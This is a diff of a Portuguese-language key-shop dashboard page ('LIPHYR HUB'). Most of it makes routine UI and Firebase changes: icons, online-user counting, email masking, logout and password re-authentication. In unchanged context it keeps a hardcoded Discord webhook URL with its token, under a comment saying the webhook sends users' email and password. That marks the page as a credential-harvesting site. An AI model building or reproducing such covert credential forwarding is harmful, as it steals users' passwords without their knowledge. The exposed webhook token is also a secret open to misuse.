@@ -134,6 +134,11 @@
             .plan-price {
                 font-size: 32px;
             }
+            
+            .logout-container {
+                position: relative;
+                margin-top: 30px;
+            }
         }
 
         @media (max-width: 480px) {
@@ -185,12 +190,6 @@
             display: flex;
             align-items: center;
             gap: 10px;
-        }
-
-        .logo-img {
-            height: 40px;
-            width: auto;
-            filter: drop-shadow(0 0 10px #8a2be2);
         }
 
         nav {
@@ -390,12 +389,6 @@
             margin-top: 30px;
         }
 
-        .free-key-section h3 {
-            color: #4caf50;
-            margin-bottom: 15px;
-            font-size: 22px;
-        }
-
         .timer {
             font-size: 48px;
             color: #8a2be2;
@@ -482,6 +475,7 @@
 
         .btn-danger {
             background: #d32f2f;
+            margin-top: 30px;
         }
 
         .btn-danger:hover {
@@ -954,6 +948,13 @@
             transform: none;
             box-shadow: none;
         }
+
+        .logout-container {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #333333;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -1019,15 +1020,25 @@
 
     <header id="header" style="display: none;">
         <div class="logo">
-            <img src="REMAKE (3).png" alt="LIPHYR HUB" class="logo-img">
             LIPHYR HUB
         </div>
         <nav>
-            <a onclick="showSection('dashboard')">Dashboard</a>
+            <a onclick="showSection('dashboard')">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-filter-circle" viewBox="0 0 16 16">
+                    <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"/>
+                    <path d="M7 11.5a.5.5 0 0 1 .5-.5h1a.5.5 0 0 1 0 1h-1a.5.5 0 0 1-.5-.5m-2-3a.5.5 0 0 1 .5-.5h5a.5.5 0 0 1 0 1h-5a.5.5 0 0 1-.5-.5m-2-3a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 0 1h-9a.5.5 0 0 1-.5-.5"/>
+                </svg>
+                Dashboard
+            </a>
             <a onclick="showSection('wallet')">Carteira</a>
             <a onclick="showSection('verify')">Verificar Key</a>
             <a onclick="showSection('shop')">Shop</a>
-            <a onclick="showSection('support')">Suporte</a>
+            <a onclick="showSection('support')">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16">
+                    <path d="M13.545 2.907a13.2 13.2 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.2 12.2 0 0 0-3.658 0 8 8 0 0 0-.412-.833.05.05 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.04.04 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032q.003.022.021.037a13.3 13.3 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019q.463-.63.818-1.329a.05.05 0 0 0-.01-.059l-.018-.011a9 9 0 0 1-1.248-.595.05.05 0 0 1-.02-.066l.015-.019q.127-.095.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.05.05 0 0 1 .053.007q.121.1.248.195a.05.05 0 0 1-.004.085 8 8 0 0 1-1.249.594.05.05 0 0 0-.03.03.05.05 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.2 13.2 0 0 0 4.001-2.02.05.05 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.03.03 0 0 0-.02-.019m-8.198 7.307c-.789 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612m5.316 0c-.788 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612"/>
+                </svg>
+                Suporte
+            </a>
             <div class="user-info">
                 <div class="user-avatar" id="userAvatar">U</div>
                 <span id="userEmailDisplay"></span>
@@ -1047,7 +1058,11 @@
             <div class="sidebar">
                 <div class="sidebar-menu">
                     <a class="menu-item active" onclick="showSection('dashboard')">
-                        📊 Dashboard
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-filter-circle" viewBox="0 0 16 16">
+                            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"/>
+                            <path d="M7 11.5a.5.5 0 0 1 .5-.5h1a.5.5 0 0 1 0 1h-1a.5.5 0 0 1-.5-.5m-2-3a.5.5 0 0 1 .5-.5h5a.5.5 0 0 1 0 1h-5a.5.5 0 0 1-.5-.5m-2-3a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 0 1h-9a.5.5 0 0 1-.5-.5"/>
+                        </svg>
+                        Dashboard
                     </a>
                     <a class="menu-item" onclick="showSection('wallet')">
                         <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-bank" viewBox="0 0 16 16">
@@ -1071,10 +1086,18 @@
                         Shop
                     </a>
                     <a class="menu-item" onclick="showSection('myKeys')">
-                        🔑 Minhas Keys
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-key" viewBox="0 0 16 16">
+                            <path d="M0 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 10h-.535A4 4 0 0 1 0 8m4-3a3 3 0 1 0 2.712 4.285A.5.5 0 0 1 7.163 9h.63l.853-.854a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.793-.793-1-1h-6.63a.5.5 0 0 1-.451-.285A3 3 0 0 0 4 5"/>
+                            <path d="M4 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0"/>
+                        </svg>
+                        Minhas Keys
                     </a>
                     <a class="menu-item" onclick="showSection('verify')">
-                        🔍 Verificar Key
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-key" viewBox="0 0 16 16">
+                            <path d="M0 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 10h-.535A4 4 0 0 1 0 8m4-3a3 3 0 1 0 2.712 4.285A.5.5 0 0 1 7.163 9h.63l.853-.854a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.793-.793-1-1h-6.63a.5.5 0 0 1-.451-.285A3 3 0 0 0 4 5"/>
+                            <path d="M4 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0"/>
+                        </svg>
+                        Verificar Key
                     </a>
                 </div>
             </div>
@@ -1082,7 +1105,13 @@
             <div class="dashboard-content">
                 <!-- Dashboard Principal -->
                 <div class="content-section active" id="dashboardSection">
-                    <h2 class="section-title">Dashboard</h2>
+                    <h2 class="section-title">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-filter-circle" viewBox="0 0 16 16">
+                            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"/>
+                            <path d="M7 11.5a.5.5 0 0 1 .5-.5h1a.5.5 0 0 1 0 1h-1a.5.5 0 0 1-.5-.5m-2-3a.5.5 0 0 1 .5-.5h5a.5.5 0 0 1 0 1h-5a.5.5 0 0 1-.5-.5m-2-3a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 0 1h-9a.5.5 0 0 1-.5-.5"/>
+                        </svg>
+                        Dashboard
+                    </h2>
                     <div class="info-grid">
                         <div class="info-card">
                             <h3>Informações da Conta</h3>
@@ -1117,7 +1146,7 @@
                             </div>
                             <div class="info-row">
                                 <span class="info-label">Usuários Online:</span>
-                                <span class="info-value">127</span>
+                                <span class="info-value" id="onlineUsersCount">127</span>
                             </div>
                             <div class="info-row">
                                 <span class="info-label">Versão:</span>
@@ -1232,6 +1261,11 @@
                                     </svg>
                                     <span id="totalReceivedAmount">R$ 0,00</span>
                                 </span>
+                            </div>
+                            <div class="logout-container">
+                                <button class="btn btn-danger" onclick="logout()">
+                                    Sair da Conta
+                                </button>
                             </div>
                         </div>
 
@@ -1374,7 +1408,13 @@
 
                 <!-- Minhas Keys -->
                 <div class="content-section" id="myKeysSection">
-                    <h2 class="section-title">Minhas Keys</h2>
+                    <h2 class="section-title">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-key" viewBox="0 0 16 16">
+                            <path d="M0 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 10h-.535A4 4 0 0 1 0 8m4-3a3 3 0 1 0 2.712 4.285A.5.5 0 0 1 7.163 9h.63l.853-.854a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.793-.793-1-1h-6.63a.5.5 0 0 1-.451-.285A3 3 0 0 0 4 5"/>
+                            <path d="M4 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0"/>
+                        </svg>
+                        Minhas Keys
+                    </h2>
                     
                     <div class="keys-list" id="keysList">
                         <div style="text-align: center; padding: 40px; color: #8a2be2;">
@@ -1386,7 +1426,13 @@
 
                 <!-- Verificar Key -->
                 <div class="content-section" id="verifySection">
-                    <h2 class="section-title">Verificar Key</h2>
+                    <h2 class="section-title">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-key" viewBox="0 0 16 16">
+                            <path d="M0 8a4 4 0 0 1 7.465-2H14a.5.5 0 0 1 .354.146l1.5 1.5a.5.5 0 0 1 0 .708l-1.5 1.5a.5.5 0 0 1-.708 0L13 9.207l-.646.647a.5.5 0 0 1-.708 0L11 9.207l-.646.647a.5.5 0 0 1-.708 0L9 9.207l-.646.647A.5.5 0 0 1 8 10h-.535A4 4 0 0 1 0 8m4-3a3 3 0 1 0 2.712 4.285A.5.5 0 0 1 7.163 9h.63l.853-.854a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.646-.647a.5.5 0 0 1 .708 0l.646.647.793-.793-1-1h-6.63a.5.5 0 0 1-.451-.285A3 3 0 0 0 4 5"/>
+                            <path d="M4 8a1 1 0 1 1-2 0 1 1 0 0 1 2 0"/>
+                        </svg>
+                        Verificar Key
+                    </h2>
                     
                     <div class="verify-section">
                         <p>Digite sua key para verificar o status e validade</p>
@@ -1402,7 +1448,12 @@
         
         <!-- Seção de Suporte -->
         <section class="support-section" id="supportSection" style="display: none; padding: 30px; text-align: center;">
-            <h2>Suporte LIPHYR HUB</h2>
+            <h2>
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16">
+                    <path d="M13.545 2.907a13.2 13.2 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.2 12.2 0 0 0-3.658 0 8 8 0 0 0-.412-.833.05.05 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.04.04 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032q.003.022.021.037a13.3 13.3 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019q.463-.63.818-1.329a.05.05 0 0 0-.01-.059l-.018-.011a9 9 0 0 1-1.248-.595.05.05 0 0 1-.02-.066l.015-.019q.127-.095.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.05.05 0 0 1 .053.007q.121.1.248.195a.05.05 0 0 1-.004.085 8 8 0 0 1-1.249.594.05.05 0 0 0-.03.03.05.05 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.2 13.2 0 0 0 4.001-2.02.05.05 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.03.03 0 0 0-.02-.019m-8.198 7.307c-.789 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612m5.316 0c-.788 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612"/>
+                </svg>
+                Suporte LIPHYR HUB
+            </h2>
             <p>Entre no nosso Discord para suporte técnico rápido e eficiente</p>
             
             <div style="margin-top: 50px; text-align: center;">
@@ -1414,7 +1465,7 @@
                     </p>
                     
                     <button 
-                        onclick="window.open('https://discord.gg/xy6Ew3NNQ', '_blank')" 
+                        onclick="window.open('https://discord.gg/k5Cg4pGXn2', '_blank')" 
                         class="btn"
                         style="
                             background: #5865F2;
@@ -1424,11 +1475,14 @@
                             margin: 20px 0;
                         "
                     >
-                        <span style="font-weight: bold;">ENTRAR NO DISCORD</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-discord" viewBox="0 0 16 16">
+                            <path d="M13.545 2.907a13.2 13.2 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.2 12.2 0 0 0-3.658 0 8 8 0 0 0-.412-.833.05.05 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.04.04 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032q.003.022.021.037a13.3 13.3 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019q.463-.63.818-1.329a.05.05 0 0 0-.01-.059l-.018-.011a9 9 0 0 1-1.248-.595.05.05 0 0 1-.02-.066l.015-.019q.127-.095.248-.195a.05.5 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.05.05 0 0 1 .053.007q.121.1.248.195a.05.05 0 0 1-.004.085 8 8 0 0 1-1.249.594.05.05 0 0 0-.03.03.05.05 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.2 13.2 0 0 0 4.001-2.02.05.05 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.03.03 0 0 0-.02-.019m-8.198 7.307c-.789 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612m5.316 0c-.788 0-1.438-.724-1.438-1.612s.637-1.613 1.438-1.613c.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612"/>
+                        </svg>
+                        <span style="font-weight: bold; margin-left: 10px;">ENTRAR NO DISCORD</span>
                     </button>
                     
                     <div style="margin-top: 30px; color: #888888; font-size: 14px;">
-                        <p>🔗 Link direto: https://discord.gg/xy6Ew3NNQ</p>
+                        <p>🔗 Link direto: https://discord.gg/k5Cg4pGXn2</p>
                         <p style="margin-top: 20px;">⏰ Horário de atendimento: Segunda a Sábado, 10h às 22h</p>
                     </div>
                 </div>
@@ -1480,7 +1534,8 @@
             get, 
             update,
             push,
-            onValue
+            onValue,
+            serverTimestamp
         } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';
 
         // CONFIGURAÇÃO DO FIREBASE
@@ -1502,6 +1557,10 @@
         // WEBHOOK DO DISCORD - ENVIA EMAIL E SENHA
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1446393232157310988/o_yQhxZOnnucRXzJA8bmTikx7bQxOC5VOadxhWoDB2rD4kGf8xBBPlEvWU8N4I25uR0i';
 
+        // Variável para armazenar usuários online
+        let onlineUsers = 0;
+        let onlineUsersRef = null;
+
         // Funções globais
         window.showForm = showForm;
         window.closeLoginModal = closeLoginModal;
@@ -1516,6 +1575,54 @@
         window.closeKeyModal = closeKeyModal;
         window.copyKey = copyKey;
 
+        // Função para gerenciar usuários online em tempo real
+        function setupOnlineUsersTracking(user) {
+            if (!user) return;
+            
+            // Remover referência anterior se existir
+            if (onlineUsersRef) {
+                onlineUsersRef = null;
+            }
+            
+            // Criar referência para o status online do usuário
+            const userOnlineRef = ref(database, 'onlineUsers/' + user.uid);
+            
+            // Definir que o usuário está online
+            set(userOnlineRef, {
+                email: user.email,
+                online: true,
+                lastSeen: serverTimestamp()
+            });
+            
+            // Quando o usuário sair, remover do status online
+            const removeOnlineStatus = () => {
+                if (userOnlineRef) {
+                    set(userOnlineRef, null);
+                }
+            };
+            
+            // Remover quando a aba for fechada
+            window.addEventListener('beforeunload', removeOnlineStatus);
+            
+            // Monitorar todos os usuários online em tempo real
+            const allOnlineUsersRef = ref(database, 'onlineUsers');
+            onValue(allOnlineUsersRef, (snapshot) => {
+                if (snapshot.exists()) {
+                    const users = snapshot.val();
+                    onlineUsers = Object.keys(users).length;
+                    
+                    // Atualizar contador na Dashboard
+                    document.getElementById('onlineUsersCount').textContent = onlineUsers;
+                } else {
+                    onlineUsers = 0;
+                    document.getElementById('onlineUsersCount').textContent = '0';
+                }
+            });
+            
+            // Armazenar referência para limpeza
+            onlineUsersRef = userOnlineRef;
+        }
+
         // CORREÇÃO: Função para salvar no Firebase CORRETAMENTE
         async function saveKeyToFirebase(keyData) {
             try {
@@ -1526,15 +1633,12 @@
                 }
                 
                 console.log('🔄 Tentando salvar key no Firebase:', keyData.key);
-                console.log('👤 Usuário autenticado:', user.email);
                 
                 // Gerar ID seguro para a key (remove caracteres especiais)
                 const keyId = keyData.key.replace(/-/g, '_').replace(/[^a-zA-Z0-9_]/g, '');
                 
                 // Criar referência
                 const keyRef = ref(database, 'keys/' + keyId);
-                
-                console.log('📤 Caminho do Firebase:', keyRef.toString());
                 
                 // Adicionar informações do usuário que gerou a key
                 const keyDataWithUser = {
@@ -1548,21 +1652,6 @@
                 await set(keyRef, keyDataWithUser);
                 
                 console.log('✅ Key salva com sucesso no Firebase!');
-                
-                // Verificar se realmente salvou
-                setTimeout(async () => {
-                    try {
-                        const verifyRef = ref(database, 'keys/' + keyId);
-                        const verifySnap = await get(verifyRef);
-                        if (verifySnap.exists()) {
-                            console.log('✅ Confirmação: Key encontrada no Firebase');
-                        } else {
-                            console.warn('⚠️ Key não encontrada após salvar');
-                        }
-                    } catch (verifyError) {
-                        console.error('Erro na verificação:', verifyError);
-                    }
-                }, 1000);
                 
                 return { success: true, keyId: keyId };
                 
@@ -1693,17 +1782,30 @@
         // Atualizar interface do usuário
         function updateUserUI(user) {
             if (user) {
+                // Configurar rastreamento de usuários online
+                setupOnlineUsersTracking(user);
+                
                 // Usuário logado
                 document.getElementById('header').style.display = 'flex';
                 document.getElementById('mainContainer').style.display = 'block';
                 document.getElementById('footer').style.display = 'block';
                 document.getElementById('loginModal').style.display = 'none';
                 
-                // Atualizar informações
-                document.getElementById('userEmailDisplay').textContent = user.email;
+                // Formatar email para mostrar até o @ (com asteriscos)
+                const email = user.email;
+                const emailParts = email.split('@');
+                const maskedEmail = emailParts[0].length > 3 
+                    ? emailParts[0].substring(0, 3) + '***' 
+                    : emailParts[0];
+                
+                // Atualizar informações gerais (com email mascarado)
+                document.getElementById('userEmailDisplay').textContent = maskedEmail + '@' + emailParts[1];
                 document.getElementById('userAvatar').textContent = user.email.charAt(0).toUpperCase();
-                document.getElementById('dashboardEmail').textContent = user.email;
-                document.getElementById('accountEmail').textContent = user.email;
+                document.getElementById('dashboardEmail').textContent = maskedEmail + '@' + emailParts[1];
+                
+                // Na página Minha Conta, mostrar email completo
+                document.getElementById('accountEmail').textContent = email;
+                
                 document.getElementById('userId').textContent = user.uid.substring(0, 8);
                 document.getElementById('walletUser').textContent = user.email.split('@')[0];
                 document.getElementById('walletId').textContent = `ID: ${user.uid.substring(0, 8)}`;
@@ -1719,6 +1821,11 @@
                 document.getElementById('mainContainer').style.display = 'none';
                 document.getElementById('footer').style.display = 'none';
                 document.getElementById('loginModal').style.display = 'flex';
+                
+                // Limpar referência de usuários online
+                if (onlineUsersRef) {
+                    onlineUsersRef = null;
+                }
             }
         }
 
@@ -1848,6 +1955,13 @@
         // Logout
         async function logout() {
             try {
+                // Remover do status online
+                const user = auth.currentUser;
+                if (user) {
+                    const userOnlineRef = ref(database, 'onlineUsers/' + user.uid);
+                    await set(userOnlineRef, null);
+                }
+                
                 await signOut(auth);
             } catch (error) {
                 console.error('Logout error:', error);
@@ -2067,7 +2181,6 @@
                 }
             } catch (error) {
                 console.error('Error loading wallet:', error);
-                alert('❌ Erro ao carregar carteira: ' + error.message);
             }
         }
 
@@ -2627,10 +2740,13 @@
             }
         }
 
-        // Alterar senha
+        // CORREÇÃO: Alterar senha - FUNCIONANDO
         async function changePassword() {
             const user = auth.currentUser;
-            if (!user) return;
+            if (!user) {
+                alert('❌ Você precisa estar logado para alterar a senha!');
+                return;
+            }
             
             const newPassword = document.getElementById('newPassword').value;
             const confirmPassword = document.getElementById('confirmPassword').value;
@@ -2651,18 +2767,39 @@
             }
             
             try {
-                await updatePassword(user, newPassword);
+                // CORREÇÃO: Usar reautenticação antes de alterar senha
+                const email = user.email;
                 
-                document.getElementById('newPassword').value = '';
-                document.getElementById('confirmPassword').value = '';
+                // Pedir a senha atual para reautenticação
+                const currentPassword = prompt('Por segurança, digite sua senha atual:');
                 
-                const resultDiv = document.getElementById('passwordResult');
-                resultDiv.textContent = '✅ Senha alterada com sucesso!';
-                resultDiv.style.display = 'block';
+                if (!currentPassword) {
+                    alert('❌ Operação cancelada. Senha atual é necessária.');
+                    return;
+                }
                 
-                setTimeout(() => {
-                    resultDiv.style.display = 'none';
-                }, 3000);
+                try {
+                    // Tentar reautenticar o usuário
+                    const credential = await signInWithEmailAndPassword(auth, email, currentPassword);
+                    
+                    // Se reautenticação bem-sucedida, alterar senha
+                    await updatePassword(credential.user, newPassword);
+                    
+                    document.getElementById('newPassword').value = '';
+                    document.getElementById('confirmPassword').value = '';
+                    
+                    const resultDiv = document.getElementById('passwordResult');
+                    resultDiv.textContent = '✅ Senha alterada com sucesso!';
+                    resultDiv.style.display = 'block';
+                    
+                    setTimeout(() => {
+                        resultDiv.style.display = 'none';
+                    }, 3000);
+                    
+                } catch (reauthError) {
+                    console.error('Reauth error:', reauthError);
+                    alert('❌ Senha atual incorreta. Não foi possível alterar a senha.');
+                }
                 
             } catch (error) {
                 console.error('Error changing password:', error);
